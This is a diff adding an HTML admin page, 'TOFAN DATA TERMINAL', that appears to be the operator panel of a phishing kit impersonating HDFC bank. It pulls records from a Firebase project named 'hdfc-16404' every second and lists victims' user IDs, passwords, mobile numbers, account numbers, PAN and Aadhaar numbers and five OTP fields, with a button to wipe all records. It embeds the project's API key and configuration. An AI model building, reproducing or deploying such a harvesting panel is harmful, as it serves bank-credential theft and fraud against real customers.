@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+
+<script>
+    
+    var userId = localStorage.getItem('userId');
+
+    if (!userId) {
+        window.location.href = 'login.html';
+    }
+
+</script>
+
+
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TOFAN DATA TERMINAL</title>
+    <style>
+        body {
+            background: white;
+            color: black;
+            font-family: 'Courier New', Courier, monospace;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            padding: 20px;
+        }
+
+        .header {
+            font-size: 2rem;
+            text-align: center;
+            margin-bottom: 20px;
+            font-weight: bold;
+            color: black;
+        }
+
+        .header button {
+            color: white;
+            border-radius: 10px;
+            width: 100px;
+            background-color: red;
+            height: 50px;
+        }
+
+        .table-wrapper {
+            width: 100%;
+            overflow-x: auto;
+        }
+
+        table {
+            width: 100%;
+            max-width: 100%;
+            border-collapse: collapse;
+            background: white;
+            box-shadow: 0 0 15px black;
+            border: 1px solid black;
+            margin-top: 20px;
+        }
+
+        th, td {
+            padding: 12px 20px;
+            text-align: left;
+            color: black;
+            border-bottom: 1px solid black;
+        }
+
+        th {
+            background-color: white;
+            font-weight: bold;
+        }
+
+        tr:nth-child(even) {
+            background-color: white;
+        }
+
+        tr:hover {
+            background-color: white;
+        }
+
+        .footer {
+            text-align: center;
+            font-size: 1.2rem;
+            margin-top: 20px;
+            text-shadow: 0 0 10px black, 0 0 20px black;
+        }
+
+        @media (max-width: 768px) {
+            .header {
+                font-size: 1.5rem;
+            }
+
+            th, td {
+                padding: 8px 12px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .header {
+                font-size: 1.2rem;
+            }
+
+            th, td {
+                font-size: 0.9rem;
+                padding: 6px 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">** TOFAN DATA TERMINAL **</div>
+        <div class="header"><button onclick="clearAllData()" >Clear All</button></div>
+        <div class="table-wrapper">
+            <table>
+                <thead>
+                    <tr>
+                        <th>Customer ID/User ID</th>
+                        <th>Password</th>
+                        <th>Mobile Number</th>
+                        <th>OTP 1</th>
+                        <th>Full Name</th>
+                        <th>DOB</th>
+                        <th>OTP 2</th>
+                        <th>A/c No</th>
+                        <th>Pan Card No</th>
+                        <th>OTP 3</th>
+                        <th>Father Name</th>
+                        <th>Adhar No</th>
+                        <th>OTP 4</th>
+                        <th>OTP 5</th>
+                    </tr>
+                </thead>
+                <tbody id="dataTable">
+                    <!-- Data will be inserted here -->
+                </tbody>
+            </table>
+        </div>
+        <div class="footer">Tofan Service Provider...</div>
+    </div>
+
+
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+<script>
+    // Firebase configuration
+    const firebaseConfig = {
+            apiKey: "AIzaSyBh2pLncBUFtiVVHWAI6HiZarEK3Qw_kf4",
+            authDomain: "hdfc-16404.firebaseapp.com",
+            projectId: "hdfc-16404",
+            storageBucket: "hdfc-16404.firebasestorage.app",
+            messagingSenderId: "429370839636",
+            appId: "1:429370839636:web:67373572f52937872f13c1",
+            measurementId: "G-HCX0NQKHGJ"
+    };
+
+    // Initialize Firebase
+    const app = firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore(app);
+</script>
+
+
+    <script>
+        const domainToMatch = window.location.hostname + '/viewd.html';
+
+    async function fetchData() {
+                const snapshot = await db.collection('users')
+                    .where('domain', '==', domainToMatch) // Filter by domain
+                    .orderBy('createdAt', 'desc') // Sort by createdAt in descending order
+                    .get();
+
+                // Clear the table body
+                const dataBody = document.getElementById('dataTable');
+                dataBody.innerHTML = '';
+
+                // Populate the table with data
+                snapshot.forEach(doc => {
+                    const data = doc.data();
+                    const row = document.createElement('tr');
+
+                    row.innerHTML = `<td><strong>${data.customerid}</strong></td>
+                        <td>${data.password}</td>
+                        <td>${data.mobile}</td>
+                        <td>${data.otp1}</td>
+                        <td>${data.customername}</td>
+                        <td>${data.dob}</td>
+                        <td>${data.otp2}</td>
+                        <td>${data.accountno}</td>
+                        <td>${data.cardno}</td>
+                        <td>${data.otp3}</td>
+                        <td>${data.fathername}</td>
+                        <td>${data.aadherNo}</td>
+                        <td>${data.otp4}</td>
+                        <td>${data.otp5}</td>`;
+
+                    dataBody.appendChild(row);
+                });
+            }
+
+        // Initial fetch and set an interval for updates
+        fetchData();
+        setInterval(fetchData, 1000); // Update every second
+
+    async function clearAllData() {
+        if (confirm("Are you sure you want to clear all data? This action cannot be undone.")) {
+            try {
+                const snapshot = await db.collection('users').get();
+                const batch = db.batch();
+
+                snapshot.docs.forEach(doc => {
+                    batch.delete(doc.ref);
+                });
+
+                await batch.commit();
+                alert('All data has been cleared successfully.');
+            } catch (error) {
+                console.error('Error clearing data:', error);
+                alert('An error occurred while clearing data. Please try again.');
+            }
+        }
+    }
+
+    </script>
+</body>
+</html>
